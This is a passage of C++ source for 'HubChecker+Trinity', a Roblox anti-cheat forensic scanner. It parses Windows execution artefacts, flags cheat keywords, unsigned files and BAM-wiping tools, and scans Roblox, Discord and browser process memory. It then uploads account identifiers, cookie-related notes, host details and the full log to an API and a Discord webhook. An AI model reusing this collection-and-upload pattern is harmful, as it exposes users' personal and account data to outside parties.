        string fnLow = Lower(FileNameOnly(rec.resolvedPathOrig));
        bool   kwHit = false;
        string hitKw;
        for (auto& kw : KW) {
            if (MatchesWholeWord(fnLow, kw) || MatchesWholeWord(pathLow, kw)) {
                kwHit = true; hitKw = kw; break;
            }
        }

        // Report if: keyword match OR pattern scan found something.
        // Pattern-only hits catch unsigned tools that don't match any keyword
        // but contain cheat-specific strings (e.g. a tool named "overlay.exe").
        bool patternHit = !rec.patternHits.empty();
        if (!kwHit && !patternHit) continue;

        flagged++;

        wstring wResolved(rec.resolvedPathOrig.begin(), rec.resolvedPathOrig.end());
        bool exists = (GetFileAttributesW(wResolved.c_str()) != INVALID_FILE_ATTRIBUTES);
        string signerName;
        SigStatus sig = SigStatus::NotSigned;
        if (exists) sig = CheckSignature(wResolved, &signerName);

        string presenceStr = exists ? "Yes" : "No (Deleted)";
        string sigStr = exists ? SigStatusStr(sig) : "N/A (not on disk)";

        // Current logon instance check
        bool inInstance = IsInCurrentLogonInstance(rec.timestamp, logonTime);

        Log("============================================");
        if (kwHit)
            Log("[HIT] Keyword    : " + hitKw);
        else
            Log("[HIT] Keyword    : (none - flagged by pattern scan)");
        Log("      Tool       : BAM (native)");
        Log("      Source     : " + rec.source);
        Log("      Path       : " + rec.resolvedPathOrig);
        Log("      File Name  : " + FileNameOnly(rec.resolvedPathOrig));
        Log("      Last Run   : " + rec.timestamp);
        Log("      In Session : " + string(inInstance ? "YES - ran in current logon" : "No"));
        Log("      Signature  : " + sigStr);
        if (!signerName.empty()) Log("      Signer     : " + signerName);
        Log("      On Disk    : " + presenceStr);
        Log("      User SID   : " + rec.sid);
        if (!rec.username.empty())
            Log("      Username   : " + rec.username);
        if (rec.sequenceNumber > 0)
            Log("      BAM SeqNum : " + std::to_string(rec.sequenceNumber) +
                (rec.sequenceNumber > 1 ? "  (counter incremented " +
                    std::to_string(rec.sequenceNumber - 1) + " time(s) since first write)" : ""));
        if (!rec.patternHits.empty()) {
            Log("      Patterns   : " + std::to_string(rec.patternHits.size()) + " hit(s)");
            for (auto& p : rec.patternHits)
                Log("                   - " + p);
        }
        Log("============================================");

        // Dedicated evidence-tampering alert for Deleted.BAM.Keys.exe.
        // This tool is specifically designed to delete BAM registry entries to
        // hide execution history — its presence is a direct indicator of
        // anti-forensic activity, not a routine cheat keyword match.
        {
            string fnLow = Lower(FileNameOnly(rec.resolvedPathOrig));
            if (fnLow == "deleted.bam.keys.exe" || fnLow == "deletebamkeys.exe") {
                Log("============================================");
                Log("[!] EVIDENCE TAMPERING ALERT");
                Log("    Deleted.BAM.Keys.exe was executed on this machine.");
                Log("    This tool is designed to delete BAM registry entries");
                Log("    to erase program execution history from the Windows");
                Log("    Background Activity Monitor (BAM) hive.");
                Log("    BAM data prior to this execution may be incomplete.");
                Log("    Path    : " + rec.resolvedPathOrig);
                Log("    Last Run: " + rec.timestamp);
                Log("============================================");
            }
        }
    }

    Log("  [~] BAM scan complete: " + std::to_string(totalEntries) +
        " unique entries across all passes, " + std::to_string(flagged) + " flagged");
}

// =========================================================================
//  Directory cleanup helper
// =========================================================================
static void CleanDir(const wstring& dir) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        DeleteFileW((dir + L"\\" + fd.cFileName).c_str());
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

// =========================================================================
//  Recursive directory deletion (handles nested subdirs)
// =========================================================================
static void RecursiveDeleteDir(const wstring& dir) {
    WIN32_FIND_DATAW fd;
    // FIX: L"\*" is an unrecognized escape sequence (UB in C++) - corrected to L"\\*"
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        wstring name = fd.cFileName;
        if (name == L"." || name == L"..") continue;
        wstring full = dir + L"\\" + name;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            RecursiveDeleteDir(full);
            RemoveDirectoryW(full.c_str());
        }
        else {
            // Clear read-only flag if set
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
                SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
            DeleteFileW(full.c_str());
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    RemoveDirectoryW(dir.c_str());
}

// =========================================================================
//  Global HubOut cleanup — called on normal exit AND ctrl handler
// =========================================================================
static void CleanupHubOut() {
    RecursiveDeleteDir(L"C:\\HubOut");
}

// Console control handler — fires on Ctrl+C, Ctrl+Break, window close,
// logoff and shutdown.  We get ~5 s before Windows force-kills the process
// so we delete HubOut synchronously and return FALSE to allow default handling.
static BOOL WINAPI HubCtrlHandler(DWORD ctrlType) {
    (void)ctrlType;
    CleanupHubOut();
    return FALSE;   // let the default handler terminate the process
}

// =========================================================================
//  Run - dispatch to the correct tool runner, then scan CSVs
// =========================================================================
static void Run(const wstring& exe, const ToolCfg& cfg, const wstring& vss) {
    string tl = Lower(WtoS(cfg.name));
    wstring fn = wstring(cfg.name); fn = fn.substr(0, fn.find(L'.'));
    wstring outDir = L"C:\\HubOut\\" + fn;
    CreateDirectoryW(L"C:\\HubOut", nullptr);
    CreateDirectoryW(outDir.c_str(), nullptr);
    CleanDir(outDir);

    if (tl.find("amcache") != string::npos) RunAmcache(exe, outDir, vss);
    else if (tl.find("appcompat") != string::npos) RunAppCompat(exe, outDir, vss);
    else if (tl.find("pecmd") != string::npos) RunPECmd(exe, outDir);
    else if (tl.find("mfte") != string::npos) RunMFTECmd(exe, outDir, vss);
    else if (tl.find("jlecmd") != string::npos) RunJLECmd(exe, outDir);
    else if (tl.find("lecmd") != string::npos) RunLECmd(exe, outDir);
    else if (tl.find("rbcmd") != string::npos) RunRBCmd(exe, outDir);
    else if (tl.find("sbecmd") != string::npos) RunSBECmd(exe, outDir);
    else if (tl.find("evtxecmd") != string::npos) RunEvtxECmd(exe, outDir);
    else if (tl.find("recentfilecache") != string::npos) RunRecentFileCache(exe, outDir, vss);
    else if (tl.find("srumecmd") != string::npos) RunSrumECmd(exe, outDir, vss);
    else if (tl.find("wxtcmd") != string::npos) RunWxTCmd(exe, outDir);
    else if (tl.find("sumecmd") != string::npos) RunSumECmd(exe, outDir, vss);
    else if (tl.find("recmd") != string::npos)   RunRECmd(exe, outDir, vss);
    else if (tl.find("bstrings") != string::npos) { RunBstrings(exe, outDir); return; }
    else { Log("  [!] Unknown tool: " + tl); return; }

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW((outDir + L"\\*.csv").c_str(), &fd);
    if (hf == INVALID_HANDLE_VALUE) {
        bool quietSkip = (tl.find("wxtcmd") != string::npos) ||
            (tl.find("recentfilecache") != string::npos) ||
            (tl.find("recmd") != string::npos) ||
            (tl.find("sumecmd") != string::npos);
        if (quietSkip)
            Log("  [~] No CSV written (no keyword hits or tool skipped - see messages above)");
        else
            Log("  [!] No CSV written to " + WtoS(outDir.c_str()));
        return;
    }
    do { Log("  [csv] Written: " + WtoS(fd.cFileName)); } while (FindNextFileW(hf, &fd));
    FindClose(hf);
    ScanCSVs(outDir, WtoS(cfg.name));
}

// =========================================================================
//  Per-tool dispatch helpers
// =========================================================================
static wstring FindToolOnDisk(const wstring& filename) {
    wchar_t sp[MAX_PATH]; GetModuleFileNameW(nullptr, sp, MAX_PATH);
    wstring sd(sp); sd = sd.substr(0, sd.rfind(L'\\'));
    wstring c1 = sd + L"\\" + filename, c2 = L"C:\\Tools\\" + filename;
    if (GetFileAttributesW(c1.c_str()) != INVALID_FILE_ATTRIBUTES) return c1;
    if (GetFileAttributesW(c2.c_str()) != INVALID_FILE_ATTRIBUTES) return c2;
    return L"";
}
static wstring ExtractOneTool(const wstring& filename) {
    for (int j = 0; j < g_embeddedToolCount; j++)
        if (wcscmp(g_embeddedTools[j].filename, filename.c_str()) == 0 && g_embeddedTools[j].available)
            return Extract(g_embeddedTools[j]);
    return L"";
}

static void ProcessTool(const wchar_t* toolName, const wstring& vss) {
    if (wcscmp(toolName, L"WxTCmd.dll") == 0 ||
        wcscmp(toolName, L"WxTCmd.runtimeconfig.json") == 0) return;

    const EmbeddedTool* te = nullptr;
    for (int i = 0; i < g_embeddedToolCount; i++)
        if (wcscmp(g_embeddedTools[i].filename, toolName) == 0) { te = &g_embeddedTools[i]; break; }
    if (!te) { Log("[skip] " + WtoS(toolName) + " (not embedded)"); return; }
    if (!te->available) { Log("[skip] " + WtoS(toolName) + " (not embedded)"); return; }

    const ToolCfg* cfg = nullptr;
    for (auto& c : CFGS) if (wcscmp(c.name, toolName) == 0) { cfg = &c; break; }
    if (!cfg) return;

    Log("[*] Running: " + WtoS(toolName));
    wstring exe = Extract(*te);
    if (exe.empty()) {
        Log("  [!] Extraction failed - searching on disk ...");
        exe = FindToolOnDisk(toolName);
        if (!exe.empty()) Log("  [+] Found: " + WtoS(exe.c_str()));
    }
    if (exe.empty()) { Log("  [!] Tool not found"); Log(""); return; }

    wstring tmpDir = TmpDir();
    bool wasExtracted = (exe.size() >= tmpDir.size() && exe.substr(0, tmpDir.size()) == tmpDir);

    static const wchar_t* WXT_COMPS[] = { L"WxTCmd.dll", L"WxTCmd.runtimeconfig.json", nullptr };
    vector<wstring> companions;
    if (wcscmp(toolName, L"WxTCmd.exe") == 0) {
        wstring exeDir = exe.substr(0, exe.rfind(L'\\'));
        for (int ci = 0; WXT_COMPS[ci]; ci++) {
            wstring dst = exeDir + L"\\" + WXT_COMPS[ci];
            if (GetFileAttributesW(dst.c_str()) != INVALID_FILE_ATTRIBUTES) continue;
            wstring src = ExtractOneTool(WXT_COMPS[ci]);
            if (src.empty()) src = FindToolOnDisk(WXT_COMPS[ci]);
            if (!src.empty()) {
                if (src != dst) {
                    // Companion was extracted to a different location than the
                    // exe dir — copy it across, then delete the temp extraction
                    // so we don't leave stray files in %TEMP%.
                    CopyFileW(src.c_str(), dst.c_str(), FALSE);
                    wstring srcDir = src.substr(0, src.rfind(L'\\'));
                    if (srcDir + L"\\" == TmpDir()) DeleteFileW(src.c_str());
                }
                // When src == dst the companion was extracted directly into the
                // exe dir (both are in %TEMP%).  Do NOT delete it here — that
                // would erase the companion before WxTCmd.exe ever runs, which
                // is exactly what caused the
                //   "The application to execute does not exist: WxTCmd.dll"
                // crash.  Cleanup is handled below via the companions list
                // after Run() returns.
                companions.push_back(dst);
                Log("  [+] Companion extracted: " + WtoS(WXT_COMPS[ci]));
            }
            else {
                Log("  [!] Companion not found: " + WtoS(WXT_COMPS[ci]) + " - place it next to HubChecker.exe");
            }
        }
    }

    Run(exe, *cfg, vss);

    if (wasExtracted) DeleteFileW(exe.c_str());
    for (auto& c : companions) DeleteFileW(c.c_str());
    Log("");
}

// =========================================================================
//  Parallel tool runner
// =========================================================================
struct ToolThreadArg { const wchar_t* name; const wstring* vss; };

static DWORD WINAPI ToolThread(LPVOID p) {
    auto* a = reinterpret_cast<ToolThreadArg*>(p);
    tl_logDefer = true;
    ProcessTool(a->name, *a->vss);
    LogFlush();
    return 0;
}

static void RunGroup(std::initializer_list<const wchar_t*> tools, const wstring& vss) {
    vector<ToolThreadArg> args;
    for (auto* n : tools) args.push_back({ n, &vss });
    vector<HANDLE> ths;
    ths.reserve(args.size());
    for (auto& a : args) {
        HANDLE h = CreateThread(nullptr, 0, ToolThread, &a, 0, nullptr);
        if (h) ths.push_back(h);
    }
    if (!ths.empty()) {
        WaitForMultipleObjects((DWORD)ths.size(), ths.data(), TRUE, INFINITE);
        for (auto h : ths) CloseHandle(h);
    }
}

int main(int argc, char* argv[]) {
    (void)argc; (void)argv;
    LoadNtDll();
    SetConsoleCtrlHandler(HubCtrlHandler, TRUE);

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    wstring logPath(exePath);
    logPath = logPath.substr(0, logPath.rfind(L'\\')) + L"\\HubChecker_results.txt";
    gLog.open(WtoS(logPath.c_str()));
    InitializeCriticalSection(&gLogCs);

    Log("HubChecker+Trinity - Forensic & Roblox Keyword Scanner");
    Log("Keywords: " + []() {
        string kws;
        for (auto& k : KW) { if (!kws.empty()) kws += ", "; kws += k; }
        return kws;
        }());
    Log("Tools: AmcacheParser, AppCompatCacheParser, PECmd, MFTECmd ($MFT + $J),");
    Log("       JLECmd, LECmd, RBCmd, SBECmd, EvtxECmd,");
    Log("       RecentFileCacheParser, SrumECmd, WxTCmd, SumECmd, RECmd,");
    Log("       BAM (native - SID resolution, SequenceNumber, session detection)");
    Log("       USN Journal (native standalone - full ReasonMask, FRN path resolution)");
    Log("       USN Journal ($J also parsed via MFTECmd for full CSV history)");
    Log("       Roblox memory/process/logs/FFlags, Discord memory, browser memory, Run keys, UserAssist");
    Log("       Prefetch/Amcache/Shimcache/SRUM/Defender/BAM integrity, USB history, system restore, recent folder");
    Log("====================================================");
    Log("");

    EnablePrivilege(L"SeBackupPrivilege");
    EnablePrivilege(L"SeRestorePrivilege");
    EnablePrivilege(L"SeSecurityPrivilege");
    EnablePrivilege(L"SeTakeOwnershipPrivilege");
    EnablePrivilege(L"SeDebugPrivilege");

    HANDLE hToken = nullptr; bool isAdmin = false;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION e = {}; DWORD sz = sizeof(e);
        GetTokenInformation(hToken, TokenElevation, &e, sz, &sz);
        CloseHandle(hToken); isAdmin = e.TokenIsElevated;
    }
    if (!isAdmin) {
        Log("[!] Must run as Administrator.");
        gLog.close(); system("pause"); return 1;
    }
    Log("[+] Running as Administrator");
    Log("[+] NT native API loaded");
    Log("");

    wstring vss = CreateVssSnapshot();

    RunBAMScan(vss);
    {
        // seenFrnUsn is shared between the live FSCTL scan and the carver.
        // The scan populates it; the carver uses it to skip already-reported records.
        std::set<std::pair<LONGLONG, LONGLONG>> seenFrnUsn;
        RunUSNJournalScan(seenFrnUsn);
        RunUSNJournalCarve(seenFrnUsn, vss);
    }
    RunGroup({ L"AmcacheParser.exe", L"AppCompatCacheParser.exe" }, vss);
    RunGroup({ L"JLECmd.exe", L"LECmd.exe", L"RBCmd.exe", L"SBECmd.exe",
               L"RecentFileCacheParser.exe", L"WxTCmd.exe", L"SumECmd.exe" }, vss);
    RunGroup({ L"PECmd.exe", L"SrumECmd.exe", L"RECmd.exe", L"bstrings.exe" }, vss);
    RunGroup({ L"MFTECmd.exe", L"EvtxECmd.exe" }, vss);

    // =========================================================================
    //  Cheat Signature + Suspicious Unsigned Report
    //  Cheat Signature: all hits (known cheat publishers)
    //  Not Signed: only files in user-writable suspicious locations
    // =========================================================================
    {
        struct SigEntry {
            string source;
            string path;
            string filename;
            string status;   // "Cheat Signature" or "Not signed"
            string signer;
            string lastRun;
        };
        vector<SigEntry> results;

        // Returns true if a path is in a suspicious user-writable location
        // (not a system dir, not a legit program install, not a game/compiler)
        auto IsSuspiciousPath = [](const string& p) -> bool {
            string pl = Lower(p);
            // Flag anything under user-writable areas, no exclusions
            const char* suspiciousPrefixes[] = {
                "c:\\users\\", "c:\\programdata\\", nullptr
            };
            for (int i = 0; suspiciousPrefixes[i]; i++)
                if (pl.find(suspiciousPrefixes[i]) == 0) return true;
            return false;
            };

        // ── BAM pass ─────────────────────────────────────────────────────────
        {
            auto volMap = BuildVolumeMap();
            std::map<string, BAMRecord> bamRecords;
            {
                const wchar_t* livePaths[] = {
                    L"SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings",
                    L"SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings",
                    L"SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings",
                    L"SYSTEM\\ControlSet001\\Services\\bam\\UserSettings",
                    nullptr
                };
                for (int i = 0; livePaths[i]; i++) {
                    HKEY hBam = nullptr;
                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, livePaths[i],
                        0, KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hBam) == ERROR_SUCCESS) {
                        ScanBAMHiveRoot(hBam, volMap, "BAM-Live", bamRecords);
                        RegCloseKey(hBam);
                    }
                }
            }

            for (auto& kv : bamRecords) {
                const BAMRecord& rec = kv.second;
                if (rec.resolvedPathOrig.empty()) continue;
                wstring wp(rec.resolvedPathOrig.begin(), rec.resolvedPathOrig.end());
                bool exists = (GetFileAttributesW(wp.c_str()) != INVALID_FILE_ATTRIBUTES);
                if (!exists) continue;
                string signer;
                SigStatus sig = CheckSignature(wp, &signer);
                if (sig == SigStatus::Signed) continue;

                if (sig == SigStatus::Cheat ||
                    (sig == SigStatus::NotSigned && IsSuspiciousPath(rec.resolvedPathOrig))) {
                    SigEntry e;
                    e.source = "BAM-Live";
                    e.path = rec.resolvedPathOrig;
                    e.filename = FileNameOnly(rec.resolvedPathOrig);
                    e.status = SigStatusStr(sig);
                    e.signer = signer;
                    e.lastRun = rec.timestamp;
                    results.push_back(e);
                }
            }
        }

        // ── Prefetch pass ─────────────────────────────────────────────────────
        {
            wstring csvDir = L"C:\\HubOut\\PECmd";
            WIN32_FIND_DATAW fd;
            HANDLE h = FindFirstFileW((csvDir + L"\\*.csv").c_str(), &fd);
            if (h != INVALID_HANDLE_VALUE) {
                do {
                    wstring wp = csvDir + L"\\" + fd.cFileName;
                    string csvName = WtoS(fd.cFileName);
                    if (Lower(csvName).find("timeline") != string::npos) continue;

                    FILE* fp = nullptr; _wfopen_s(&fp, wp.c_str(), L"rb");
                    if (!fp) continue;
                    string content; char buf2[4096]; size_t n;
                    while ((n = fread(buf2, 1, sizeof(buf2), fp)) > 0) content.append(buf2, n);
                    fclose(fp);

                    if (content.size() >= 3 &&
                        (unsigned char)content[0] == 0xEF &&
                        (unsigned char)content[1] == 0xBB &&
                        (unsigned char)content[2] == 0xBF)
                        content = content.substr(3);

                    std::istringstream ss(content);
                    string line; vector<string> headers; bool firstRow = true;
                    while (std::getline(ss, line)) {
                        if (!line.empty() && line.back() == '\r') line.pop_back();
                        if (line.empty()) continue;
                        vector<string> row = SplitCSV(line);
                        if (firstRow) { headers = row; firstRow = false; continue; }

                        string exeName = Get(row, Col(headers, "executablename"));
                        if (exeName.empty()) continue;
                        string lastRun = Get(row, Col(headers, "lastrun"));
                        string filesLoaded = Get(row, Col(headers, "filesloaded"));

                        string resolvedPath;
                        string exeLow = Lower(exeName);
                        if (!filesLoaded.empty()) {
                            std::istringstream fss(filesLoaded);
                            string token;
                            while (std::getline(fss, token, ',')) {
                                size_t a = token.find_first_not_of(" \t");
                                if (a != string::npos) token = token.substr(a);
                                if (Lower(token).find(exeLow) != string::npos &&
                                    Lower(token).find(".exe") != string::npos) {
                                    size_t bs = token.find('\\', token.find('}'));
                                    if (bs != string::npos) resolvedPath = "C:" + token.substr(bs);
                                    break;
                                }
                            }
                        }
                        if (resolvedPath.empty()) continue;

                        wstring wPath(resolvedPath.begin(), resolvedPath.end());
                        bool present = (GetFileAttributesW(wPath.c_str()) != INVALID_FILE_ATTRIBUTES);
                        if (!present) continue;  // skip deleted — not actionable here

                        string signer;
                        SigStatus sig = CheckSignature(wPath, &signer);
                        if (sig == SigStatus::Signed) continue;

                        // Only report files that exist on disk — deleted files
                        // cannot be signature-checked and produce misleading "Not signed"
                        // entries in the report (they were checked above via exists guard).
                        if (sig == SigStatus::Cheat ||
                            (sig == SigStatus::NotSigned && IsSuspiciousPath(resolvedPath))) {
                            SigEntry e;
                            e.source = "Prefetch";
                            e.path = resolvedPath;
                            e.filename = exeName;
                            e.status = SigStatusStr(sig);
                            e.signer = signer;
                            e.lastRun = lastRun;
                            results.push_back(e);
                        }
                    }
                } while (FindNextFileW(h, &fd));
                FindClose(h);
            }
        }

        // ── Deduplicate by path ───────────────────────────────────────────────
        {
            std::set<string> seen;
            vector<SigEntry> deduped;
            for (auto& e : results) {
                string key = Lower(e.path);
                if (!seen.count(key)) { seen.insert(key); deduped.push_back(e); }
            }
            results = deduped;
        }

        // ── Print ─────────────────────────────────────────────────────────────
        if (!results.empty()) {
            Log("");
            Log("====================================================");
            Log("  SIGNATURE ALERT REPORT");
            Log("  Cheat Signature: known cheat publisher certs");
            Log("  Not Signed (Not signed): unsigned files in suspicious locations");
            Log("====================================================");

            const char* groups[] = { "Cheat Signature", "Not signed", nullptr };
            for (int g = 0; groups[g]; g++) {
                string groupLabel = groups[g];
                vector<SigEntry*> bucket;
                for (auto& e : results)
                    if (e.status == groupLabel) bucket.push_back(&e);
                if (bucket.empty()) continue;
                Log("");
                Log("  -- " + groupLabel + " (" + std::to_string(bucket.size()) + ") --");
                for (auto* e : bucket) {
                    Log("  [" + e->source + "] " + e->filename);
                    Log("         Path    : " + e->path);
                    if (!e->signer.empty())  Log("         Signer  : " + e->signer);
                    if (!e->lastRun.empty()) Log("         Last Run: " + e->lastRun);
                }
            }
            Log("");
            Log("  Total: " + std::to_string(results.size()) + " entry(ies)");
            Log("====================================================");
            Log("  END OF SIGNATURE ALERT REPORT");
            Log("====================================================");
        }
        else {
            Log("");
            Log("  [sig] No cheat signatures or suspicious unsigned files found.");
        }
    }

    if (!vss.empty()) {
        Log("[*] Cleaning up VSS snapshot ...");
        DeleteVssSnapshot(vss);
    }

    // =========================================================================
    //  Phase 2: Trinity live scans (Roblox, Discord, registry, UserAssist)
    // =========================================================================
    Log("");
    Log("====================================================");
    Log("  TRINITY LIVE SCAN PHASE");
    Log("====================================================");

    TrinityResults tr;
    SystemInfo sysInfo = TrinityGetSystemInfo();

    Log("[T] System: " + sysInfo.hostname + " / " + sysInfo.username);
    Log("[T] OS: " + sysInfo.osVersion);
    if (!sysInfo.windowsInstallDate.empty())
        Log("[T] Windows Install Date: " + sysInfo.windowsInstallDate);
    if (!sysInfo.robloxAccounts.empty())
        for (auto& id : sysInfo.robloxAccounts) Log("[T] Roblox Account: " + id);
    else Log("[T] Roblox Accounts: none found");
    if (!sysInfo.robloxCookieNotes.empty())
        for (auto& n : sysInfo.robloxCookieNotes) Log("[T] " + n);
    if (!sysInfo.discordAccounts.empty())
        for (auto& d : sysInfo.discordAccounts) Log("[T] Discord Account: " + d);
    else Log("[T] Discord Accounts: none found");
    if (!sysInfo.robloxProfileUrls.empty())
        for (auto& u : sysInfo.robloxProfileUrls) Log("[T] Roblox Profile: " + u);

    Log("");
    Log("[T] Scanning Roblox process memory ...");
    tr.robloxMemory = ScanRobloxMemory();
    Log(tr.robloxMemory);

    Log("[T] Checking injected modules in Roblox ...");
    tr.injectedModules = CheckRobloxInjectedModules();
    Log(tr.injectedModules);

    Log("[T] Scanning Discord process memory ...");
    // Fix 3: Use shared_ptr so detached thread never writes to a destroyed stack variable
    {
        auto dmResult = std::make_shared<string>("Discord Memory: scan timed out");
        std::thread t([dmResult]() { *dmResult = ScanDiscordMemory(); });
        auto start = std::chrono::steady_clock::now();
        while (std::chrono::steady_clock::now() - start < std::chrono::seconds(15)) {
            if (!t.joinable()) break;
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        if (t.joinable()) t.detach();
        tr.discordMemory = *dmResult;
    }
    Log(tr.discordMemory);

    Log("[T] Reading Roblox logs ...");
    tr.robloxLogs = TrinityFetchRobloxLogs();
    if (tr.robloxLogs.empty()) Log("  Roblox Logs: None found");
    else {
        for (size_t i = 0; i < tr.robloxLogs.size(); ++i) {
            Log("  [Roblox Log " + std::to_string(i + 1) + "]");
            // Scan each log for keywords
            string logLow = Lower(tr.robloxLogs[i]);
            vector<string> logHits;
            for (auto& kw : KW)
                if (logLow.find(kw) != string::npos)
                    logHits.push_back(kw);
            if (!logHits.empty()) {
                string kws;
                for (auto& k : logHits) { if (!kws.empty()) kws += ", "; kws += k; }
                Log("  >> Keywords found in log: " + kws);
            }
            else Log("  >> No keywords found");
        }
    }

    Log("[T] Scanning Roblox FFlags ...");
    tr.robloxFlags = ScanRobloxFlags();
    for (auto& f : tr.robloxFlags) Log("  " + f);


    Log("[T] Checking Run/RunOnce registry keys ...");
    tr.runKeys = CheckRunKeysNative();
    Log(tr.runKeys);

    Log("[T] Scanning Recent Items ...");
    tr.recentItems = ScanRecentItemsNative();
    if (tr.recentItems.empty()) Log("  Recent Items: No keyword matches");
    else for (auto& r2 : tr.recentItems) Log("  " + r2);

    Log("[T] Scanning UserAssist ...");
    tr.userAssist = ScanUserAssistForKeywords();
    if (tr.userAssist.empty()) Log("  UserAssist: No keyword matches");
    else for (auto& r2 : tr.userAssist) Log("  " + r2);

    Log("[T] Scanning browser process memory ...");
    tr.browserMemory = ScanBrowserMemory();
    Log(tr.browserMemory);

    Log("[T] Checking Prefetch integrity ...");
    tr.prefetchIntegrity = CheckPrefetchIntegrity();
    Log(tr.prefetchIntegrity);

    Log("[T] Checking Amcache integrity ...");
    tr.amcacheIntegrity = CheckAmcacheIntegrity();
    Log(tr.amcacheIntegrity);

    Log("[T] Checking Shimcache integrity ...");
    tr.shimcacheIntegrity = CheckShimcacheIntegrity();
    Log(tr.shimcacheIntegrity);

    Log("[T] Checking SRUM integrity ...");
    tr.srumIntegrity = CheckSrumIntegrity();
    Log(tr.srumIntegrity);

    Log("[T] Checking Windows Defender integrity ...");
    tr.defenderIntegrity = CheckDefenderIntegrity();
    Log(tr.defenderIntegrity);

    Log("[T] Checking BAM service integrity ...");
    tr.bamIntegrity = CheckBamIntegrity();
    Log(tr.bamIntegrity);

    Log("[T] Scanning USB storage history ...");
    tr.usbHistory = CheckUsbStorHistory();
    Log(tr.usbHistory);

    Log("[T] Checking system restore / VSS points ...");
    tr.systemRestore = CheckSystemRestorePoints();
    Log(tr.systemRestore);

    Log("[T] Checking Recent folder integrity ...");
    tr.recentFolderIntegrity = CheckRecentFolderIntegrity();
    Log(tr.recentFolderIntegrity);

    Log("[T] Scanning services for keywords and suspicious paths ...");
    tr.servicesCheck = CheckServicesForKeywords();
    Log(tr.servicesCheck);

    Log("[T] Scanning user dirs for unsigned executables ...");
    tr.unsignedExes = ScanUnsignedExecutablesInUserDirs();
    Log(tr.unsignedExes);

    Log("");
    Log("====================================================");
    Log("  END OF TRINITY LIVE SCAN PHASE");
    Log("====================================================");
    Log("");

    Log("[*] Cleaning up C:\\HubOut ...");
    CleanupHubOut();

    // =========================================================================
    //  Flush and finalize the local log file first
    // =========================================================================
    Log("====================================================");
    Log("[*] Done. Results saved to HubChecker_results.txt");
    gLog.flush();
    // Close will happen after upload so the file is complete

    // =========================================================================
    //  Phase 3: Discord webhook + API submission
    // =========================================================================
    {
        string logFilePathStr = WtoS(logPath.c_str());

        // Build JSON payload
        string jsonPayload = BuildTrinityJson(tr, sysInfo, logFilePathStr);

        // 3a — POST JSON to Trinity API
        Log("[T] Submitting JSON to Trinity API ...");
        bool apiOk = TrinityHttpPost(TRINITY_API_URL + "/api/scan", jsonPayload);
        Log(apiOk ? "[T] API submission: OK" : "[T] API submission: FAILED (will continue)");

        // 3b — POST JSON to Discord webhook as a JSON message
        //      Discord webhook accepts content + embeds; we send a compact summary embed
        {
            string content =
                "{\"content\":\"**HubChecker+Trinity scan complete**\\n"
                "Host: " + sysInfo.hostname + " | User: " + sysInfo.username +
                " | OS: " + sysInfo.osVersion + "\","
                "\"username\":\"HubTrinity\"}";
            Log("[T] Posting summary to Discord webhook ...");
            bool whOk = TrinityHttpPost(TRINITY_WEBHOOK, content);
            Log(whOk ? "[T] Webhook summary: OK" : "[T] Webhook summary: FAILED");
        }

        // 3c — Upload full log file to Discord webhook
        Log("[T] Uploading log file to Discord webhook ...");
        bool uploadOk = TrinityHttpPostFile(TRINITY_WEBHOOK, logFilePathStr);
        Log(uploadOk ? "[T] Log upload: OK" : "[T] Log upload: FAILED");
    }

    gLog.close();
    DeleteCriticalSection(&gLogCs);
    system("pause");
}